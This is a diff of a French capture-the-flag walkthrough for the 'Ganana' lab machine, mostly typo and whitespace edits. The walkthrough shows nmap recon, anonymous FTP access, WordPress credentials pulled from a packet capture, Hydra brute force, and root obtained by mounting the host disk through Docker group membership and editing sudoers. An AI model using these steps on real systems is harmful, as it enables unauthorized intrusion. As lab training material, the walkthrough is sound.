@@ -14,51 +14,51 @@ Starting Nmap 7.92 ( https://nmap.org )
 Nmap scan report for 192.168.56.21 
 Host is up (0.00033s latency). 
 Not shown: 65531 filtered tcp ports (no-response) 
-PORT     STATE  SERVICE  VERSION 
-22/tcp   closed ssh 
-80/tcp   open   http     Apache httpd (PHP 7.3.17) 
+PORT     STATE  SERVICE  VERSION 
+22/tcp   closed ssh 
+80/tcp   open   http     Apache httpd (PHP 7.3.17) 
 |_http-title: Ganana 
-| http-robots.txt: 1 disallowed entry  
+| http-robots.txt: 1 disallowed entry  
 |_/wp-admin/ 
 |_http-generator: WordPress 5.4.2 
 |_http-server-header: Apache 
-443/tcp  open   ssl/http Apache httpd (PHP 7.3.17) 
+443/tcp  open   ssl/http Apache httpd (PHP 7.3.17) 
 |_ssl-date: TLS randomness does not represent time 
 | ssl-cert: Subject: commonName=www.example.com/organizationName=Bitnami 
 | Not valid before: 2020-06-06T10:55:45 
-|_Not valid after:  2030-06-04T10:55:45 
+|_Not valid after:  2030-06-04T10:55:45 
 |_http-generator: WordPress 5.4.2 
-| http-robots.txt: 1 disallowed entry  
+| http-robots.txt: 1 disallowed entry  
 |_/wp-admin/ 
 |_http-title: Ganana 
 |_http-server-header: Apache 
-6777/tcp open   ftp      vsftpd 3.0.3 
-| ftp-syst:  
-|   STAT:  
+6777/tcp open   ftp      vsftpd 3.0.3 
+| ftp-syst:  
+|   STAT:  
 | FTP server status: 
-|      Connected to ::ffff:192.168.56.1 
-|      Logged in as ftp 
-|      TYPE: ASCII 
-|      No session bandwidth limit 
-|      Session timeout in seconds is 300 
-|      Control connection is plain text 
-|      Data connections will be plain text 
-|      At session startup, client count was 1 
-|      vsFTPd 3.0.3 - secure, fast, stable 
+|      Connected to ::ffff:192.168.56.1 
+|      Logged in as ftp 
+|      TYPE: ASCII 
+|      No session bandwidth limit 
+|      Session timeout in seconds is 300 
+|      Control connection is plain text 
+|      Data connections will be plain text 
+|      At session startup, client count was 1 
+|      vsFTPd 3.0.3 - secure, fast, stable 
 |_End of status 
 | ftp-anon: Anonymous FTP login allowed (FTP code 230) 
 |_Can't get directory listing: TIMEOUT
 ```
 
-Le port 443 semble identique au port 80 donc on oublie aussitôt. Le port SSH est quand à lui fermé ce qui nous compliquera éventuellement la tache. Pour finir un serveur FTP écoute sur le port 6777 et autorise les connexions anonymes.  
+Le port 443 semble identique au port 80 donc on oublie aussitôt. Le port SSH est quant à lui fermé ce qui nous compliquera éventuellement la tache. Pour finir un serveur FTP écoute sur le port 6777 et autorise les connexions anonymes.  
 
 ```console
 $ ftp 192.168.56.21 -P 6777 
 Connected to 192.168.56.21. 
 220 (vsFTPd 3.0.3) 
-Name (192.168.56.21:sirius): anonymous 
+Name (192.168.56.21:devloop): anonymous 
 331 Please specify the password. 
-Password:  
+Password:  
 230 Login successful. 
 Remote system type is UNIX. 
 Using binary mode to transfer files. 
@@ -67,9 +67,9 @@ Passive mode: off; fallback to active mode: off.
 ftp> ls -a 
 200 EPRT command successful. Consider using EPSV. 
 150 Here comes the directory listing. 
-drwxr-xr-x    3 0        112          4096 Jun 06  2020 . 
-drwxr-xr-x    3 0        112          4096 Jun 06  2020 .. 
-drwxr-xr-x    2 0        0            4096 Jun 06  2020 .Welcome 
+drwxr-xr-x    3 0        112          4096 Jun 06  2020 . 
+drwxr-xr-x    3 0        112          4096 Jun 06  2020 .. 
+drwxr-xr-x    2 0        0            4096 Jun 06  2020 .Welcome 
 226 Directory send OK. 
 ftp> put shell.php 
 local: shell.php remote: shell.php 
@@ -80,20 +80,20 @@ ftp> cd .Welcome
 ftp> ls -a 
 200 EPRT command successful. Consider using EPSV. 
 150 Here comes the directory listing. 
-drwxr-xr-x    2 0        0            4096 Jun 06  2020 . 
-drwxr-xr-x    3 0        112          4096 Jun 06  2020 .. 
--rw-r--r--    1 0        0              82 Jun 06  2020 .Note.txt 
+drwxr-xr-x    2 0        0            4096 Jun 06  2020 . 
+drwxr-xr-x    3 0        112          4096 Jun 06  2020 .. 
+-rw-r--r--    1 0        0              82 Jun 06  2020 .Note.txt 
 226 Directory send OK. 
 ftp> get .Note.txt 
 local: .Note.txt remote: .Note.txt 
 200 EPRT command successful. Consider using EPSV. 
 150 Opening BINARY mode data connection for .Note.txt (82 bytes). 
-100% |****************************************************************|    82       37.98 KiB/s    00:00 ETA 
+100% |****************************************************************|    82       37.98 KiB/s    00:00 ETA 
 226 Transfer complete. 
 82 bytes received in 00:00 (29.98 KiB/s)
 ```
 
-Les transferts de fichiers échouent en mode passif mais en mode actif cela fonctionne très bien.  
+Les transferts de fichiers échouent en mode passif, mais en mode actif cela fonctionne très bien.  
 
 On ne peut pas déposer de fichiers sur le serveur et le fichier obtenu ne nous est d'aucune utilité :  
 
@@ -148,7 +148,7 @@ by Ben "epi" Risher 🤓                 ver: 2.4.0
 302        0l        0w        0c http://192.168.56.21/resetpass
 ```
 
-Je remarque (en ouvrant les différentes URLs) que le Wordpress présent est configuré pour que sa zone admin soit */secret* au lieu de l'habituel */wp-admin*.  
+Je remarque (en ouvrant les différentes URLs) que le Wordpress présent est configuré pour que sa zone admin soit `/secret` au lieu de l'habituel `/wp-admin`.  
 
 Le fichier *tasks* contient le contenu suivant :  
 
@@ -161,9 +161,9 @@ Le fichier *tasks* contient le contenu suivant :
 > Admin has created an other temp account for you and details in a pcapng file. 
 
 Bien sûr, c'est normal de communiquer un mot de passe à quelqu'un en lui refilant un pcapng :D
-Alors que j'avais lancé cette fois une énumérations sur les fichiers j'ai fait ce qui me semblait le plus logique : vérifier si il y avait un fichier *jarret.pcapng* à la racine. C'était le cas :)  
+Alors que j'avais lancé cette fois une énumération sur les fichiers, j'ai fait ce qui me semblait le plus logique : vérifier s'il y avait un fichier `jarret.pcapng` à la racine. C'était le cas :)  
 
-Il y a différents échanges dans la capture : DNS, TLS, etc. Evidemment on est plus intéressés par le trafic en clair sur la page de login du wordpress. Avec le filtre suivant je peux voir 5 requêtes HTTP POST :  
+Il y a différents échanges dans la capture : DNS, TLS, etc. Évidemment on est plus intéressés par le trafic en clair sur la page de login du wordpress. Avec le filtre suivant je peux voir 5 requêtes HTTP POST :  
 
 ```
 http.request.method == "POST"
@@ -195,7 +195,7 @@ Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in mi
 Hydra (https://github.com/vanhauser-thc/thc-hydra)
 [DATA] max 12 tasks per 1 server, overall 12 tasks, 12 login tries (l:6/p:2), ~1 try per task 
 [DATA] attacking ftp://192.168.56.21:6777/ 
-[6777][ftp] host: 192.168.56.21   login: jarretlee   password: NoBrUtEfOrCe__R3Qu1R3d__ 
+[6777][ftp] host: 192.168.56.21   login: jarretlee   password: NoBrUtEfOrCe__R3Qu1R3d__ 
 1 of 1 target successfully completed, 1 valid password found 
 ```
 
@@ -213,7 +213,7 @@ Le serveur utilise *Bitnami* qui est un logiciel permettant d'installer facileme
 
 Ainsi j'ai fini par trouver le dossier */opt/bitnami/apps/wordpress/htdocs* dans lequel se trouvait le fichier *wp-config.php*.  
 
-A ce titre ce n'était pas évident qu'on puisse lire son contenu car le fichier était marqué en lecture uniquement pour l'utilisateur et le groupe et à côté l'upload de fichier échouait sur des dossiers qui avait les permissions d'écriture pour le groupe. Bref l'auteur du CTF a du changer le groupe associé au fichier *wp-config.php* et malheureusement le nom du groupe n’apparaît pas sur FileZilla.  
+À ce titre ce n'était pas évident qu'on puisse lire son contenu car le fichier était marqué en lecture uniquement pour l'utilisateur et le groupe et à côté l'upload de fichier échouait sur des dossiers qui avait les permissions d'écriture pour le groupe. Bref l'auteur du CTF a du changer le groupe associé au fichier *wp-config.php* et malheureusement le nom du groupe n’apparaît pas sur FileZilla.  
 
 ```php
 /** The name of the database for WordPress */ 
@@ -252,13 +252,13 @@ On dispose justement du mot de passe de l'utilisateur *jeevan* (*hannahmontana*)
 Cet utilisateur est membre du groupe Docker. On va créer un container en indiquant que l'on veut monter le disque de la machine. L'accès root obtenu dans le container nous permettra d'accéder au système de fichier de l'hôte.  
 
 ```console
-jeevan@debian:/$ docker images  
-REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE 
-bash                latest              0980cb958276        20 months ago       13.1MB 
-alpine              latest              a24bb4013296        20 months ago       5.57MB 
-hello-world         latest              bf756fb1ae65        2 years ago         13.3kB
+jeevan@debian:/$ docker images  
+REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE 
+bash                latest              0980cb958276        20 months ago       13.1MB 
+alpine              latest              a24bb4013296        20 months ago       5.57MB 
+hello-world         latest              bf756fb1ae65        2 years ago         13.3kB
 
-jeevan@debian:/$ docker run -v /:/mnt/ -it alpine /bin/sh   
+jeevan@debian:/$ docker run -v /:/mnt/ -it alpine /bin/sh   
 / # cd /mnt 
 /mnt # cd etc 
 /mnt/etc # cat sudoers 
@@ -270,9 +270,9 @@ jeevan@debian:/$ docker run -v /:/mnt/ -it alpine /bin/sh   
 # 
 # See the man page for details on how to write a sudoers file. 
 # 
-Defaults        env_reset 
-Defaults        mail_badpass 
-Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin" 
+Defaults        env_reset 
+Defaults        mail_badpass 
+Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin" 
 
 # Host alias specification 
 
@@ -281,7 +281,7 @@ Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/us
 # Cmnd alias specification 
 
 # User privilege specification 
-root    ALL=(ALL:ALL) ALL 
+root    ALL=(ALL:ALL) ALL 
 
 # Allow members of group sudo to execute any command 
 
@@ -295,19 +295,19 @@ Avec cette ligne ajoutée au fichier *sudoers* je peux obtenir un shell root :
 
 ```console
 jeevan@debian:/$ sudo su 
-[sudo] password for jeevan:  
+[sudo] password for jeevan:  
 root@debian:/# id 
 uid=0(root) gid=0(root) groups=0(root) 
 root@debian:/# cd /root 
 root@debian:~# ls 
-bitnami  bitnami_credentials  jeevan  root.txt 
-root@debian:~# cat root.txt  
+bitnami  bitnami_credentials  jeevan  root.txt 
+root@debian:~# cat root.txt  
 
-                    _       _                 _                              _     
- __ __ __  ___     | |     | |      o O O  __| |    ___    _ _      ___     | |    
- \ V  V / / -_)    | |     | |     o      / _` |   / _ \  | ' \    / -_)    |_|    
-  \_/\_/  \___|   _|_|_   _|_|_   TS__[O] \__,_|   \___/  |_||_|   \___|   _(_)_   
-_|"""""|_|"""""|_|"""""|_|"""""| {======|_|"""""|_|"""""|_|"""""|_|"""""|_| """ |  
+                    _       _                 _                              _     
+ __ __ __  ___     | |     | |      o O O  __| |    ___    _ _      ___     | |    
+ \ V  V / / -_)    | |     | |     o      / _` |   / _ \  | ' \    / -_)    |_|    
+  \_/\_/  \___|   _|_|_   _|_|_   TS__[O] \__,_|   \___/  |_||_|   \___|   _(_)_   
+_|"""""|_|"""""|_|"""""|_|"""""| {======|_|"""""|_|"""""|_|"""""|_|"""""|_| """ |  
 "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 
 ```
